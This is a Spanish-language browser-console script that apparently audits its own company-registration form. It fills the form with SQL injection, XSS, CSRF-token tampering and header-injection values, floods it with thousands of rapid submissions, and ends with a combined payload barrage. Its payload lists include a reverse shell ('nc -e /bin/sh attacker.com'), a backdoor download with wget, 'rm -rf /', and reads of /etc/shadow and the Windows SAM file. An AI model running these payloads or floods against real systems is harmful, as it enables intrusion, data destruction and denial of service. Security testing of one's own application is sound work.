//=============================================================================================
// ?? PRUEBA 1: SQL Injection (Verificación)
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 1: SQL Injection');

// Limpiar campos
document.getElementById('empresaNit').value = "' OR '1'='1";
document.getElementById('empresaNombre').value = 'Test SQLi';
document.getElementById('empresaEmail').value = 'test@test.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Calle 78b';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Payload SQL Injection en NIT aplicado');
console.log('?? ESPERADO: Formulario RECHAZADO + Log guardado');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 2: XSS (Cross-Site Scripting)
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 2: XSS');

// Limpiar campos  
document.getElementById('empresaNit').value = '12345678';
document.getElementById('empresaNombre').value = '<script>alert("XSS Attack")</script>';
document.getElementById('empresaEmail').value = 'test@test.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Calle 78b';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Payload XSS en NOMBRE aplicado');
console.log('?? ESPERADO: Formulario RECHAZADO + Log guardado');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 3: CSRF (Token Bypass)
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 3: CSRF');

// Cambiar token CSRF por uno falso
const tokenOriginal = document.querySelector('input[name="csrf_token"]').value;
document.querySelector('input[name="csrf_token"]').value = 'token_falso_12345';

// Datos válidos para probar solo el CSRF
document.getElementById('empresaNit').value = '87654321';
document.getElementById('empresaNombre').value = 'Test CSRF';
document.getElementById('empresaEmail').value = 'csrf@test.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Calle CSRF';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Token CSRF cambiado a falso');
console.log('?? ESPERADO: Rechazo por token inválido');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 4: Rate Limiting
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 4: Rate Limiting');

// Función para envío automático
function envioRapido(intento) {
    document.getElementById('empresaNit').value = `1111111${intento}`;
    document.getElementById('empresaNombre').value = `Spam Test ${intento}`;
    document.getElementById('empresaEmail').value = `spam${intento}@test.com`;
    document.getElementById('empresaTelefono').value = '1234567890';
    document.getElementById('empresaDireccion').value = 'Spam Address';
    document.getElementById('empresaIdRepresentante').value = '1234567';
    document.getElementById('empresaNomRepresentante').value = 'Carlos';
    
    // Enviar
    document.querySelector('button[onclick="guardarEmpresa()"]').click();
}

// Enviar 10 formularios rápidos
for(let i = 1; i <= 10; i++) {
    setTimeout(() => {
        envioRapido(i);
        console.log(`?? Envío ${i} realizado`);
    }, i * 500); // Cada 0.5 segundos
}

console.log('?? 10 envíos rápidos programados');
console.log('?? ESPERADO: Bloqueo después de varios intentos');

//===================== ALTERNATIVA: Rate Limiting Agresivo ===================================
console.log('?? PRUEBA 4B: Rate Limiting Agresivo');

// Envío súper rápido  2000 intentos en  100 segundos
for(let i = 1; i <= 2000; i++) {
    setTimeout(() => {
        document.getElementById('empresaNit').value = `2222222${i}`;
        document.getElementById('empresaNombre').value = `Fast Spam ${i}`;
        document.getElementById('empresaEmail').value = `fastspam${i}@test.com`;
        document.getElementById('empresaTelefono').value = '1234567890';
        document.getElementById('empresaDireccion').value = 'Fast Address';
        document.getElementById('empresaIdRepresentante').value = '1234567';
        document.getElementById('empresaNomRepresentante').value = 'Carlos';
        
        document.querySelector('button[onclick="guardarEmpresa()"]').click();
        console.log(`? Envío súper rápido ${i}`);
    }, i * 50); // Cada 0.05 segundos = MUY AGRESIVO
}

console.log('? 20 envíos súper rápidos en 2 segundos');
console.log('?? ESPERADO: Rate limiting debe activarse');

//============== Rate limiting mucho mas agresivo ===========================================
console.log('?? PRUEBA DE SEGURIDAD COMPLETA');

// FASE 1: Bombardeo instantáneo (simula botnet coordinado)
console.log('?? FASE 1: Bombardeo instantáneo - 500 requests simultáneas');
for(let i = 1; i <= 500; i++) {
   setTimeout(() => {
       document.getElementById('empresaNit').value = `2222222${i}`;
       document.getElementById('empresaNombre').value = `Fast Spam ${i}`;
       document.getElementById('empresaEmail').value = `fastspam${i}@test.com`;
       document.getElementById('empresaTelefono').value = '1234567890';
       document.getElementById('empresaDireccion').value = 'Fast Address';
       document.getElementById('empresaIdRepresentante').value = '1234567';
       document.getElementById('empresaNomRepresentante').value = 'Carlos';
       
       document.querySelector('button[onclick="guardarEmpresa()"]').click();
       console.log(`? Bombardeo ${i}`);
   }, 0); // Todos al mismo tiempo
}

// FASE 2: Ataque sostenido (simula script automatizado)
setTimeout(() => {
   console.log('?? FASE 2: Ataque sostenido - 5500 requests cada 4ms (501 a 6000)');
   for(let i = 501; i <= 6000; i++) {
       setTimeout(() => {
           document.getElementById('empresaNit').value = `2222222${i}`;
           document.getElementById('empresaNombre').value = `Fast Spam ${i}`;
           document.getElementById('empresaEmail').value = `fastspam${i}@test.com`;
           document.getElementById('empresaTelefono').value = '1234567890';
           document.getElementById('empresaDireccion').value = 'Fast Address';
           document.getElementById('empresaIdRepresentante').value = '1234567';
           document.getElementById('empresaNomRepresentante').value = 'Carlos';
           
           document.querySelector('button[onclick="guardarEmpresa()"]').click();
           console.log(`?? Sostenido ${i}`);
       }, (i-500) * 4); // Cada 4ms, comenzando desde 501
   }
   console.log('?? RESUMEN: 5500 requests sostenidas en ~22 segundos (250 req/segundo)');
}, 2000); // Esperar 2 segundos entre fases

console.log('?? TOTAL: 6000 requests');
console.log('?? DURACIÓN: ~24 segundos total');
console.log('??? ESPERADO: Rate limiting debe activarse en ambas fases');
console.log('?? MONITOREAR: Logs de servidor, CPU, memoria, respuestas HTTP');


//=============================================================================================
// Prueba 5: Buffer Overflow
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 5: Buffer Overflow');

// Texto extremadamente largo (1000 caracteres)
const textoLargo = 'A'.repeat(1000);

document.getElementById('empresaNit').value = '12345678';
document.getElementById('empresaNombre').value = textoLargo;
document.getElementById('empresaEmail').value = 'test@test.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Calle 78b';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Texto de 1000 caracteres en NOMBRE');
console.log('?? ESPERADO: Rechazo por límite de caracteres');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 6: Datos Completamente Limpios (Control)
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 6: Datos Limpios');

// Datos 100% seguros para verificar que el sistema sí acepta datos válidos
document.getElementById('empresaNit').value = '98765432';
document.getElementById('empresaNombre').value = 'Empresa Segura SA';
document.getElementById('empresaEmail').value = 'segura@empresa.com';
document.getElementById('empresaTelefono').value = '3001234567';
document.getElementById('empresaDireccion').value = 'Calle Principal 456';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos ';

console.log('? Datos completamente seguros aplicados');
console.log('?? ESPERADO: Empresa registrada exitosamente');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 7: Timing Attack Verification
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 7: Timing Attack');

// Función para medir tiempos
async function medirTiempoV2(testName, nitValue) {
    document.getElementById('empresaNit').value = nitValue;
    document.getElementById('empresaNombre').value = `Timing ${testName}`;
    document.getElementById('empresaEmail').value = `timing${Math.random().toString().substring(2,8)}@test.com`;
    document.getElementById('empresaTelefono').value = '1234567890';
    document.getElementById('empresaDireccion').value = 'Test Address';
    document.getElementById('empresaIdRepresentante').value = '1234567';
    document.getElementById('empresaNomRepresentante').value = 'Carlos';
    
    const start = performance.now();
    
    const formData = new FormData(document.getElementById('formNuevaEmpresa'));
    
    try {
        const response = await fetch('../ajax/App_empresasAjax.php', {
            method: 'POST',
            body: formData
        });
        const result = await response.text();
        
        const end = performance.now();
        const tiempo = (end - start).toFixed(2);
        console.log(`?? ${testName}: ${tiempo}ms`);
        return tiempo;
    } catch (error) {
        const end = performance.now();
        console.log(`? ${testName}: Error`);
        return 0;
    }
}

// Ejecutar tests con diferentes NITs
console.log('?? Midiendo normalización de tiempos...');
setTimeout(() => medirTiempoV2('NIT A', '11111111'), 1000);
setTimeout(() => medirTiempoV2('NIT B', '22222222'), 4000);
setTimeout(() => medirTiempoV2('NIT C', '33333333'), 7000);

console.log('?? ESPERADO: Tiempos similares (100-120ms)');

//=============================================================================================
// PRUEBA 8: Session Management + Token Regeneration
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 8: Session Management');

// Paso 1: Guardar token actual
const tokenActual = document.querySelector('input[name="csrf_token"]').value;
console.log('?? Token actual guardado:', tokenActual.substring(0, 10) + '...');

// Paso 2: Simular token de sesión anterior (token viejo)
document.querySelector('input[name="csrf_token"]').value = 'session_token_viejo_expired_123456789';

// Datos válidos para probar solo la gestión de sesión
document.getElementById('empresaNit').value = '44444444';
document.getElementById('empresaNombre').value = 'Test Session Management';
document.getElementById('empresaEmail').value = 'session@test.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Session Address';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Token cambiado a sesión expirada simulada');
console.log('?? ESPERADO: Rechazo por token de sesión inválido');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 9: RÁPIDA Concurrent Requests
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 9: Concurrent Requests');

// Función para crear request
function crearRequestConcurrente(id) {
    const formData = new FormData();
    formData.append('empresa-nit', `5555555${id}`);
    formData.append('empresa-nombre', `Concurrent Test ${id}`);
    formData.append('empresa-direccion', `Address ${id}`);
    formData.append('empresa-telefono', `123456789${id}`);
    formData.append('empresa-email', `concurrent${id}@test.com`);
    formData.append('empresa-id-representante', '1124254141');
    formData.append('empresa-nom-representante', 'Test Rep');
    formData.append('csrf_token', document.querySelector('input[name="csrf_token"]').value);
    
    return fetch('../ajax/App_empresasAjax.php', {
        method: 'POST',
        body: formData
    });
}

// Enviar 3 requests simultáneos
console.log('? Enviando 9 requests simultáneos...');

Promise.all([
    crearRequestConcurrente(1),
    crearRequestConcurrente(2), 
    crearRequestConcurrente(3),
    crearRequestConcurrente(4),
    crearRequestConcurrente(5),
    crearRequestConcurrente(6),
    crearRequestConcurrente(7),
    crearRequestConcurrente(8),
    crearRequestConcurrente(9)
]).then(responses => {
    console.log('?? Respuestas recibidas:');
    responses.forEach((response, index) => {
        console.log(`?? Request ${index + 1}: Status ${response.status}`);
    });
}).catch(error => {
    console.error('? Error en concurrent requests:', error);
});

console.log('?? ESPERADO: Procesamiento correcto de requests simultáneos');

//=============================================================================================
// PRUEBA 10: HTTP Header Injection
//=============================================================================================

console.log('?? AUDITORÍA COMPLETA - Prueba 10: HTTP Header Injection');

// Intentar inyectar headers HTTP maliciosos
document.getElementById('empresaNit').value = '12345678';
document.getElementById('empresaNombre').value = 'Test\r\nX-Injected-Header: malicious\r\nContent-Type: text/html';
document.getElementById('empresaEmail').value = 'test@test.com\r\nLocation: http://evil.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Address\r\nSet-Cookie: evil=true';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Payloads de header injection aplicados');
console.log('?? ESPERADO: Headers tratados como texto plano');
console.log('?? Envía el formulario...');

//=============================================================================================
// PRUEBA 11: Information Disclosure (Caracteres Especiales)
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 11: Information Disclosure');

// Probar con caracteres especiales y emojis (ya mejorado)
document.getElementById('empresaNit').value = '12345678';
document.getElementById('empresaNombre').value = 'Test™©®????Company????';
document.getElementById('empresaEmail').value = 'test@test.com';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Calle 78b';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Caracteres especiales y emojis aplicados');
console.log('?? ESPERADO: Rechazo por caracteres no permitidos O caracteres filtrados');
console.log('?? Envía el formulario...');

//=============================================================================================
//  PRUEBA 12: Logging de Ataques (Verificación Final)
//=============================================================================================
console.log('?? AUDITORÍA COMPLETA - Prueba 12: Logging Completo');

// Ataque múltiple para verificar logging detallado
document.getElementById('empresaNit').value = "'; DROP TABLE test; --";
document.getElementById('empresaNombre').value = '<script>alert("Multi Attack")</script>??';
document.getElementById('empresaEmail').value = 'test@evil.com\r\nX-Header: malicious';
document.getElementById('empresaTelefono').value = '1234567890';
document.getElementById('empresaDireccion').value = 'Address<img src=x onerror=alert("XSS")>';
document.getElementById('empresaIdRepresentante').value = '1234567';
document.getElementById('empresaNomRepresentante').value = 'Carlos';

console.log('?? Ataque múltiple aplicado:');
console.log('   - SQL Injection en NIT');
console.log('   - XSS + Emojis en NOMBRE');  
console.log('   - Header Injection en EMAIL');
console.log('   - XSS en DIRECCIÓN');
console.log('?? ESPERADO: Rechazo total + Log detallado de múltiples ataques');
console.log('?? Envía el formulario...');

//=============================================================================================
// ATAQUES CON BOT PROGRAMADO (todos los ataques combinados)
//=============================================================================================

console.log('?? PRUEBA MASIVA: TODOS LOS ATAQUES COMBINADOS');
console.log('?? Objetivo: 1000 intentos con múltiples vectores de ataque');

// Payloads maliciosos para diferentes tipos de ataque
const sqlInjectionPayloads = [
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "'; INSERT INTO admin VALUES('hacker','pass'); --",
    "' UNION SELECT password FROM users --",
    "'; UPDATE users SET password='hacked' WHERE id=1; --"
];

const xssPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//"
];

const commandInjectionPayloads = [
    "; cat /etc/passwd",
    "| ls -la",
    "&& rm -rf /",
    "; wget malware.com/backdoor.sh",
    "| nc -e /bin/sh attacker.com 4444"
];

const pathTraversalPayloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/shadow",
    "C:\\windows\\system32\\drivers\\etc\\hosts"
];

const nosqlInjectionPayloads = [
    "{$ne: null}",
    "{$regex: '.*'}",
    "{$where: 'function(){return true}'}",
    "{$or: [{}, {}]}",
    "'; return true; var dummy='"
];

const bufferOverflowPayloads = [
    "A".repeat(1000),
    "B".repeat(5000),
    "X".repeat(10000),
    String.fromCharCode(255).repeat(1000)
];

const encodingAttacks = [
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E"
];

// Función para obtener payload aleatorio
function getRandomPayload(payloadArray) {
    return payloadArray[Math.floor(Math.random() * payloadArray.length)];
}

// Función para generar datos maliciosos combinados
function generarDatosMaliciosos(intento) {
    const tipoAtaque = intento % 7;
    
    switch(tipoAtaque) {
        case 0: // SQL Injection
            return {
                nit: getRandomPayload(sqlInjectionPayloads),
                nombre: `Evil Corp ${getRandomPayload(sqlInjectionPayloads)}`,
                email: `hacker${intento}@evil.com`,
                telefono: getRandomPayload(sqlInjectionPayloads),
                direccion: `Hack Street ${getRandomPayload(sqlInjectionPayloads)}`,
                idRep: getRandomPayload(sqlInjectionPayloads),
                nomRep: `Hacker ${getRandomPayload(sqlInjectionPayloads)}`
            };
            
        case 1: // XSS
            return {
                nit: `12345678${intento}`,
                nombre: getRandomPayload(xssPayloads),
                email: `test${intento}@test.com`,
                telefono: `555${intento}`,
                direccion: getRandomPayload(xssPayloads),
                idRep: `${intento}`,
                nomRep: getRandomPayload(xssPayloads)
            };
            
        case 2: // Command Injection
            return {
                nit: `78145249${intento}`,
                nombre: `Company${getRandomPayload(commandInjectionPayloads)}`,
                email: `cmd${intento}@test.com`,
                telefono: getRandomPayload(commandInjectionPayloads),
                direccion: `Address ${getRandomPayload(commandInjectionPayloads)}`,
                idRep: getRandomPayload(commandInjectionPayloads),
                nomRep: `User${getRandomPayload(commandInjectionPayloads)}`
            };
            
        case 3: // Buffer Overflow
            return {
                nit: getRandomPayload(bufferOverflowPayloads).substring(0, 20),
                nombre: getRandomPayload(bufferOverflowPayloads),
                email: `overflow${intento}@test.com`,
                telefono: getRandomPayload(bufferOverflowPayloads).substring(0, 15),
                direccion: getRandomPayload(bufferOverflowPayloads),
                idRep: getRandomPayload(bufferOverflowPayloads).substring(0, 20),
                nomRep: getRandomPayload(bufferOverflowPayloads)
            };
            
        default: // Datos vacíos/repetitivos
            return {
                nit: '',
                nombre: 'test',
                email: 'test@test.com',
                telefono: 'test',
                direccion: 'test',
                idRep: 'test',
                nomRep: 'test'
            };
    }
}

// Función de ataque principal
function ejecutarAtaqueMasivo(intento) {
    const datos = generarDatosMaliciosos(intento);
    
    document.getElementById('empresaNit').value = datos.nit;
    document.getElementById('empresaNombre').value = datos.nombre;
    document.getElementById('empresaEmail').value = datos.email;
    document.getElementById('empresaTelefono').value = datos.telefono;
    document.getElementById('empresaDireccion').value = datos.direccion;
    document.getElementById('empresaIdRepresentante').value = datos.idRep;
    document.getElementById('empresaNomRepresentante').value = datos.nomRep;
    
    document.querySelector('button[onclick="guardarEmpresa()"]').click();
    
    const tipos = ['SQL Injection', 'XSS', 'Command Injection', 'Buffer Overflow', 'Datos Vacíos'];
    console.log(`?? Ataque ${intento}/1000 - Tipo: ${tipos[intento % 5]}`);
}

// EJECUTAR ATAQUE MASIVO
console.log('?? INICIANDO ATAQUE MASIVO...');
for(let i = 1; i <= 1000; i++) {
    setTimeout(() => {
        ejecutarAtaqueMasivo(i);
        if (i % 100 === 0) {
            console.log(`?? Progreso: ${i}/1000 ataques enviados`);
        }
    }, i * 50);
}
console.log('?? 1000 ATAQUES MALICIOSOS PROGRAMADOS - ¡TORTURA INICIADA!');